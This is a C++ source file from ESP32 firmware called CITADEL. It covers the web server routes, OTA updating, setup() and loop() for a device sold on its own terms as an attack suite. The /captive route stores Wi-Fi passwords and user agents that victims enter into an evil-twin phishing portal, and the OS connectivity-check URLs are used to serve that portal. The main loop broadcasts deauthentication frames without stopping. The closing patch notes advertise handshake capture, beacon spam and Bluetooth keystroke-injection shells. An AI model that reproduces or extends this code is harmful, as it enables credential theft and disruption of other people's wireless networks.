// ==========================================================
//   CITADEL v2.0.0 — CIT_V_2_0_0
//   File 06: Server — Routes, OTA, setup(), loop()
// ==========================================================

//  OTA Setup 
void setupOTA() {
  ArduinoOTA.setHostname("citadel");
  ArduinoOTA.setPassword(otaPassword.c_str());

  ArduinoOTA.onStart([]() {
    otaRunning=true; burstClock();
    oledDraw("OTA START","DO NOT POWER","OFF");
    addLog("[OTA] Flash started.");
  });
  ArduinoOTA.onProgress([](unsigned int progress, unsigned int total) {
    int pct=total>0?(progress/(total/100)):0;
    String bar="[";
    for(int i=0;i<10;i++) bar+=i<pct/10?'#':'-';
    bar+="]";
    oledDraw("OTA: "+String(pct)+"%",bar,"FLASHING...");
  });
  ArduinoOTA.onEnd([]() {
    otaRunning=false;
    oledDraw("OTA COMPLETE","REBOOTING...","");
    addLog("[OTA] Complete. Rebooting.");
    delay(1000);
  });
  ArduinoOTA.onError([](ota_error_t error) {
    otaRunning=false;
    String e="ERR:";
    if(error==OTA_AUTH_ERROR)    e+="AUTH";
    else if(error==OTA_BEGIN_ERROR)   e+="BEGIN";
    else if(error==OTA_CONNECT_ERROR) e+="CONNECT";
    else if(error==OTA_RECEIVE_ERROR) e+="RECEIVE";
    else e+="END";
    oledDraw("OTA FAILED",e,"TRY AGAIN");
    addLog("[OTA] Failed: "+e);
    delay(2000);
  });
  ArduinoOTA.begin();
}

//  Setup 
void setup() {
  WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);
  setCpuFrequencyMhz(240); currentFreq=240;
  bootTime=millis();

  prefs.begin("citadel", false);
  apName      = prefs.getString("ap_name",    "CITADEL");
  apPass      = prefs.getString("ap_pass",    "12345678");
  btName      = prefs.getString("bt_name",    "CITADEL");
  staSSID     = prefs.getString("sta_ssid",   "");
  staPass     = prefs.getString("sta_pass",   "");
  authUser    = prefs.getString("auth_user",  "");
  authPass    = prefs.getString("auth_pass",  "");
  authEnabled = prefs.getBool("auth_on",      false);
  authTimeout = prefs.getInt("auth_timeout",  30);
  authAutoRenew = prefs.getBool("auth_renew", true);
  oledFlipped = prefs.getBool("oled_flip",    false);
  otaPassword = prefs.getString("ota_pass",   "citadel");
  ntpOffset   = prefs.getInt("ntp_offset",    0);
  sysBanner   = prefs.getString("banner",     "");

  loadPayloads();
  loadAliases();
  loadAccounts();

  Wire.begin(21, 22);
  u8g2.begin();
  u8g2.setFont(u8g2_font_6x12_tf);
  if (oledFlipped) u8g2.setDisplayRotation(U8G2_R2);
  u8g2.setContrast(prefs.getInt("oled_bright", 255));
  drawSplashScreen();
  delay(2000);

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(apName.c_str(), apPass.c_str());
  delay(200);

  if (staSSID != "") {
    oledDraw("CITADEL v2.0.0","CONNECTING STA","");
    WiFi.begin(staSSID.c_str(), staPass.c_str());
    int tries=0;
    while (WiFi.status()!=WL_CONNECTED && tries<10) { delay(500); tries++; }
    staConnected=(WiFi.status()==WL_CONNECTED);
    if (staConnected) {
      addLog("[WIFI] STA connected: "+WiFi.localIP().toString());
      configTime(ntpOffset*3600,0,"pool.ntp.org");
      delay(500);
      ntpSynced=true;
    }
  }

  if (MDNS.begin("citadel")) { MDNS.addService("arduino","tcp",3232); mdnsRunning=true; }

  setupOTA();
  const char* hkeys[] = {"Cookie", "User-Agent"};
  server.collectHeaders(hkeys, 2);

  // Manifest
  server.on("/manifest.json",[](){
    server.send(200,"application/json",
      "{\"name\":\"CITADEL\",\"short_name\":\"CITADEL\","
      "\"start_url\":\"/\",\"display\":\"fullscreen\","
      "\"background_color\":\"#000080\",\"theme_color\":\"#000080\"}");
  });

  // Root
  server.on("/",HTTP_GET,[](){
    burstClock();
    String ip=server.client().remoteIP().toString();
    if (!isWhitelisted(ip)) { server.send(403,"text/plain","FORBIDDEN"); return; }
    if (authEnabled && authUser!="" && authPass!="") {
      if (!isAuthenticated()) { server.send(200,"text/html",buildLoginPage(false,false,false)); return; }
    } else if (authUser==""||authPass=="") {
      server.send(200,"text/html",buildLoginPage(true,false,false)); return;
    }
    server.send(200,"text/html",buildTerminal());
  });

  // First boot setup
  server.on("/setup",HTTP_POST,[](){
    String u=server.arg("u"), p=server.arg("p"), p2=server.arg("p2");
    if (u==""||p==""||p!=p2) { server.send(200,"text/html",buildLoginPage(true,true,false)); return; }
    authUser=u; authPass=p; authEnabled=true;
    prefs.putString("auth_user",authUser); prefs.putString("auth_pass",authPass); prefs.putBool("auth_on",true);
    // Create OWNER account
    if (accountCount==0) { accounts[0]={u,p,"OWNER",false}; accountCount=1; saveAccounts(); }
    sessionToken=generateToken(); sessionStart=millis();
    server.sendHeader("Set-Cookie","CSID="+sessionToken+"; Path=/");
    server.sendHeader("Location","/"); server.send(302,"text/plain","");
  });

  // Login
  server.on("/login",HTTP_POST,[](){
    String ip=server.client().remoteIP().toString();
    String u=server.arg("u"), p=server.arg("p");
    if (isIpLocked(ip)) { server.send(200,"text/html",buildLoginPage(false,false,true)); return; }
    if (u==authUser && p==authPass) {
      clearFailedLogin(ip); sessionToken=generateToken(); sessionStart=millis();
      addLoginLog(ip,u,true);
      server.sendHeader("Set-Cookie","CSID="+sessionToken+"; Path=/");
      server.sendHeader("Location","/"); server.send(302,"text/plain","");
    } else {
      recordFailedLogin(ip); addLoginLog(ip,u,false);
      server.send(200,"text/html",buildLoginPage(false,true,false));
    }
  });

  // Relogin (session renew)
  server.on("/relogin",HTTP_POST,[](){
    String p=server.arg("p");
    if (p==authPass) {
      sessionToken=generateToken(); sessionStart=millis();
      server.sendHeader("Set-Cookie","CSID="+sessionToken+"; Path=/");
      server.send(200,"application/json","{\"ok\":true}");
    } else {
      server.send(200,"application/json","{\"ok\":false}");
    }
  });

  // Command endpoint
  server.on("/e",HTTP_GET,[](){
    if (authEnabled && !isAuthenticated()) { server.send(403,"text/plain","UNAUTHORIZED"); return; }
    burstClock();
    server.send(200,"text/html",runCommand(server.arg("c")));
  });

  // Status JSON
  server.on("/status",HTTP_GET,[](){
    if (authEnabled && !isAuthenticated()) { server.send(403,"application/json","{}"); return; }
    const char* modes[]={"STATUS","TERMINAL","TERM_ALERTS","CLOCK","MSG","SCROLL","HEALTH","ATTACK","NETWORK","OFF"};
    bool btPaired=btActive&&bleIsConnected();
    bool sessExpired=authEnabled&&sessionToken==""||
                     (authTimeout>0&&!authAutoRenew&&millis()-sessionStart>(unsigned long)authTimeout*60000UL);
    String json="{";
    json+="\"cpu\":"+String(currentFreq)+",";
    json+="\"temp\":\""+String(getTemp(),1)+"\",";
    json+="\"heap\":"+String(ESP.getFreeHeap()/1024)+",";
    json+="\"health\":\""+healthName(currentHealth)+"\",";
    json+="\"throttle\":\""; json+=(thermalThrottled?"YES":"NO"); json+="\",";
    json+="\"ap\":\""+WiFi.softAPIP().toString()+"\",";
    json+="\"sta\":\""; json+=(staConnected?WiFi.localIP().toString():String("N/A")); json+="\",";
    json+="\"sta_ok\":"; json+=(staConnected?"true":"false"); json+=",";
    json+="\"bt\":\""; json+=(btPaired?"PAIRED":btActive?"WAITING":"OFF"); json+="\",";
    json+="\"bt_on\":"; json+=(btActive?"true":"false"); json+=",";
    json+="\"bt_paired\":"; json+=(btPaired?"true":"false"); json+=",";
    json+="\"oled\":\""+String(modes[(int)oledMode])+"\",";
    json+="\"eviltwin\":\""; json+=(evilTwinActive?evilTwinSSID:String("OFF")); json+="\",";
    json+="\"captures\":\""+String(captureCount)+"\",";
    json+="\"deauth\":\""; json+=(deauthActive?(deauthContinuous?"CONT":"ON"):"OFF"); json+="\",";
    json+="\"session\":\""; json+=(sessExpired?"EXPIRED":(authEnabled?"ACTIVE":"N/A")); json+="\",";
    json+="\"uptime\":\""+getUptime()+"\"";
    json+="}";
    server.send(200,"application/json",json);
  });

  // Web OTA updater
  server.on("/update",HTTP_GET,[](){
    if (!otaEnabled) { server.sendHeader("Location","/"); server.send(302,"text/plain",""); return; }
    if (authEnabled && !isAuthenticated()) { server.sendHeader("Location","/"); server.send(302,"text/plain",""); return; }
    server.send(200,"text/html",
      "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
      "<title>CITADEL OTA</title>"
      "<style>body{background:#000080;display:flex;align-items:center;justify-content:center;"
      "min-height:100vh;font-family:'Courier New',monospace;}"
      ".box{background:#c0c0c0;border-top:2px solid #fff;border-left:2px solid #fff;"
      "border-right:2px solid #808080;border-bottom:2px solid #808080;padding:24px;width:320px;}"
      ".title{background:#000080;color:#fff;padding:3px 6px;font-size:13px;margin:-24px -24px 20px;}"
      "p{font-size:13px;margin-bottom:16px;}"
      "input[type=file]{width:100%;margin-bottom:16px;font-size:12px;}"
      ".btn{background:#c0c0c0;border-top:2px solid #fff;border-left:2px solid #fff;"
      "border-right:2px solid #808080;border-bottom:2px solid #808080;"
      "padding:5px 20px;font-size:13px;cursor:pointer;}"
      "#prog{display:none;margin-top:12px;font-size:13px;color:#000080;}"
      "</style></head><body><div class='box'>"
      "<div class='title'>&#9632; CITADEL OTA UPDATE</div>"
      "<p>Select compiled .bin file to flash.</p>"
      "<form method='POST' action='/update' enctype='multipart/form-data'>"
      "<input type='file' name='firmware' accept='.bin'>"
      "<button class='btn' type='submit'>FLASH</button>"
      "</form><div id='prog'></div></div></body></html>");
  });

  server.on("/update",HTTP_POST,
    [](){
      bool ok=!Update.hasError();
      server.send(200,"text/html",ok?
        "<script>setTimeout(function(){window.location='/';},5000);</script>FLASH OK. Rebooting...":
        "FLASH FAILED.");
      delay(1000); ESP.restart();
    },
    [](){
      HTTPUpload& upload=server.upload();
      if (!otaEnabled) return;
      if (upload.status==UPLOAD_FILE_START) {
        oledDraw("OTA WEB","FLASHING...","");
        addLog("[OTA] Web flash start: "+upload.filename);
        Update.begin(UPDATE_SIZE_UNKNOWN);
      } else if (upload.status==UPLOAD_FILE_WRITE) {
        Update.write(upload.buf, upload.currentSize);
      } else if (upload.status==UPLOAD_FILE_END) {
        Update.end(true);
        addLog("[OTA] Web flash complete: "+String(upload.totalSize)+" bytes");
        otaEnabled=false;
      }
    }
  );

  // Captive portal submit
  server.on("/captive",HTTP_POST,[](){
    String ua=server.header("User-Agent");
    String pwd=server.arg("p");
    if (pwd.length()>0) {
      captureCount++;
      String ts="["+getRealTime()+"]";
      capturedCreds+=ts+" SSID:"+evilTwinSSID+" PASS:"+pwd+" UA:"+ua.substring(0,30)+"\n";
      prefs.putString("creds",capturedCreds);
      addAttackLog("CAPTURE #"+String(captureCount)+": "+pwd);
    }
    server.send(200,"text/html",
      "<!DOCTYPE html><html><head>"
      "<meta name='viewport' content='width=device-width,initial-scale=1'>"
      "<meta http-equiv='refresh' content='5;url=/'>"
      "<title>Connecting...</title>"
      "<style>body{display:flex;align-items:center;justify-content:center;"
      "min-height:100vh;background:#f0f0f0;font-family:Arial,sans-serif;}"
      ".box{background:#fff;border-radius:8px;padding:32px;text-align:center;"
      "box-shadow:0 2px 16px rgba(0,0,0,0.15);}"
      "h2{margin-bottom:8px;}p{color:#666;font-size:14px;}</style></head>"
      "<body><div class='box'><h2>Connecting...</h2>"
      "<p>Please wait while we connect you to the network.</p>"
      "</div></body></html>");
  });

  // Captive portal detection URLs
  server.on("/generate_204",HTTP_GET,[](){
    if(evilTwinActive){server.send(200,"text/html",buildCaptivePortal(server.header("User-Agent")));return;}
    server.send(204,"text/plain","");
  });
  server.on("/hotspot-detect.html",HTTP_GET,[](){
    if(evilTwinActive){server.send(200,"text/html",buildCaptivePortal(server.header("User-Agent")));return;}
    server.send(200,"text/html","<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
  });
  server.on("/ncsi.txt",HTTP_GET,[](){
    if(evilTwinActive){server.send(200,"text/html",buildCaptivePortal(server.header("User-Agent")));return;}
    server.send(200,"text/plain","Microsoft NCSI");
  });
  server.on("/fwlink",HTTP_GET,[](){
    if(evilTwinActive){server.send(200,"text/html",buildCaptivePortal(server.header("User-Agent")));return;}
    server.sendHeader("Location","/"); server.send(302,"text/plain","");
  });

  server.onNotFound([](){
    if(evilTwinActive){server.send(200,"text/html",buildCaptivePortal(server.header("User-Agent")));return;}
    server.sendHeader("Location","/"); server.send(302,"text/plain","");
  });

  server.begin();

  addLog("");
  addLog("CITADEL v2.2.3 BOOT OK");
  if (sysBanner!="") addLog(sysBanner);
  addLog("AP:  "+WiFi.softAPIP().toString());
  if (staConnected) addLog("STA: "+WiFi.localIP().toString());
  if (ntpSynced)    addLog("NTP: "+getRealTime());
  addLog("");
}

//  Loop 
void loop() {
  checkThermal();
  checkHealth();
  server.handleClient();
  ArduinoOTA.handle();

  // Deferred GitHub OTA check — runs once after 15s of stable uptime
  if (!ghOtaChecked && millis() - bootTime > 15000) {
    ghOtaChecked = true;
    checkGithubOta();
  }

  // OTA auto-disable after 5 minutes
  if (otaEnabled && millis()-otaEnabledTime > 300000UL) {
    otaEnabled=false; addLog("[OTA] Auto-disabled.");
  }

  // STA connection tracking
  bool wifiNow=(WiFi.status()==WL_CONNECTED);
  if (wifiNow && !staConnected) {
    staConnected=true;
    addLog("[WIFI] STA connected: "+WiFi.localIP().toString());
    if (!ntpSynced) { configTime(ntpOffset*3600,0,"pool.ntp.org"); delay(500); ntpSynced=true; }
  } else if (!wifiNow && staConnected) {
    staConnected=false; addLog("[WIFI] STA disconnected.");
  }

  // BT connection state tracking
  if (btActive) {
    bool paired=bleIsConnected();
    if (paired && !btWasConnected) { btWasConnected=true; addLog("[BT] Device paired."); }
    else if (!paired && btWasConnected) { btWasConnected=false; addLog("[BT] Device unpaired."); }
  }

  // BLE keep-alive
  if (btActive && bleIsConnected() && millis()-lastKeepAlive>20000) {
    blePress(KEY_LEFT_SHIFT); delay(1); bleReleaseAll();
    lastKeepAlive=millis();
  }

  // Continuous deauth loop
  if (deauthActive && deauthContinuous && !emergencyKill) {
    esp_wifi_set_promiscuous(true);
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    esp_wifi_set_promiscuous(false);
    safeDelay(deauthPacketRate);
  }

  updateOled();
  yield();
}

// 
//   CITADEL  BUILD RECORD                                                 
// 
//   Version  : 2.2.3                                                       
//   Checksum : CLDTX6                                                      
// 
//   v2.0.0 PATCH NOTES                                                     
//                                                                          
//   ATTACK SUITE                                                           
//   + Evil twin with 3 portal themes (Android/iOS/Windows auto-detect)     
//   + Captive portal saves creds with timestamp, device UA to flash        
//   + WPA2 handshake capture mode + DEAUTH continuous for forced reconnect 
//   + Beacon spam with ATTACK BEACON OFF kill                              
//   + ATTACK SCAN shows BSSID+channel ready for deauth input               
//   + ATTACK STOP kills all attacks instantly using emergencyKill flag     
//   + ATTACK THEME  switch portal style manually                          
//   + ATTACK CLIENTS  who's connected to evil twin                        
//   + ATTACK LOG  timestamped history                                     
//                                                                          
//   BT SUITE                                                               
//   + BT PAYLOAD  save/run/list/delete keystroke sequences in flash       
//   + BT SHELL, BT URL, BT DOWNLOAD, BT ADMIN, BT SEARCH                  
//   + BT SCREENSHOT, BT MINALL                                             
//   + Heap check before BT ON  warns if low memory                        
//   + HELP BT MEMORY  crash prevention guide                              
//   + BT paired/unpaired events printed to terminal automatically          
//                                                                          
//   SYSTEM                                                                 
//   + 4-state health monitor (GREEN/YELLOW/ORANGE/RED)                     
//   + Emergency kill flag  stops attacks mid-operation instantly          
//   + safeDelay() replaces all delay() in attack/BT loops                 
//   + SYS PANEL  10 sidebar modes including WATCH, ATTACK, THERMAL       
//   + SYS STORAGE, SYS PREFS, SYS PREFS RESET, SYS CRASH, SYS BANNER     
//   + SYS STRESS  show heap thresholds                                    
//   + NTP time sync (SYS TIME SYNC / TIME ZONE)                            
//   + Thermal history graph in SYS THERMAL                                 
//   + OLED HEALTH, OLED ATTACK, OLED NETWORK modes                        
//   + OLED TERMINAL ALERTS  only key events, saves memory                 
//                                                                          
//   AUTH                                                                   
//   + Multi-account system (OWNER/ADMIN/USER/GUEST)                        
//   + IP whitelist, failed login lockout (3 fails = 5 min)                 
//   + Session re-login modal  no page reload on timeout                   
//   + AUTH AUTORENEW  session stays alive while active                    
//   + AUTH LOG  all login attempts with IP and timestamp                  
//   + AUTH LOGOUT command                                                   
//                                                                          
//   OTA                                                                    
//   + Web updater at /update (browser-based, no Java issues)               
//   + OTA ENABLE auto-kills all attacks before exposing update endpoint    
//   + OTA auto-disables after 5 minutes                                    
//   + OTA PASSWORD protection                                              
//                                                                          
//   QUALITY OF LIFE                                                        
//   + ALIAS system  custom command shortcuts saved to flash               
//   + HISTORY command                                                      
//   + Tab completion expanded to all new commands                          
//   + Click any output line to retype command                              
//   + Boot log prints AP/STA/NTP info to terminal on startup               
//   + WiFi connect/disconnect events auto-printed to terminal              
//   + HELP system  3 tiers, plain English, examples, kill commands        
// 
